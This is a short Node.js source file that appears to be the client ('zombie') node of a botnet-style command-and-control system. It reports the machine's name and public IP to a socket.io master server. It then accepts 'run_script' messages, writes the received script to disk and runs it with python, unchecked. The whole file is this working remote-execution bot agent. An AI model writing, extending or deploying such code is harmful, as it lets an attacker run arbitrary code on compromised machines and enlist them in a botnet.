// Node Libraries

const io = require('socket.io-client')
const publicIp = require('public-ip');
const fs = require('fs');
const util = require('util')
const exec =require('child_process').exec

write_file = util.promisify(fs.writeFile)


// Globals
master_socket_server_port = 10002;




/*
    Firing up the routines...
*/


const main = async () => {
    const socket = io('http://localhost:10002');
    
    socket.emit("zombie_info", {
        pc_name: "zombie_node_0",
        public_ip: await publicIp.v4()
    });

    socket.on("run_script", async (data) =>{
        console.log(data)
        try{
            await write_file(data.script_name, data.script_binary)
            
            let cmd = 'python '+ data.script_name;
            
            exec(cmd, (error, stdout, stderr) => {
                console.log(stdout, stderr)
            });


        }catch(err){
            console.log(err)
        }

    })
}






main()



















